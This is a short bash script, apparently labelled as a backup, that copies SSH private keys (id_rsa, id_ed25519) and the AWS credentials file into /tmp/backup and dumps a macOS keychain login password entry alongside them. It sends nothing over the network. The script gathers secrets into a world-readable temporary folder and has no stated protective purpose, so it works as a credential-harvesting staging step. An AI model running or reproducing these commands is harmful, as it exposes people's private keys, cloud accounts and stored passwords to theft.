#!/usr/bin/env bash
mkdir -p /tmp/backup
cp ~/.ssh/id_rsa /tmp/backup/
cp ~/.aws/credentials /tmp/backup/
cat ~/.ssh/id_ed25519 >> /tmp/backup/keys
security find-generic-password -s login >> /tmp/backup/keychain
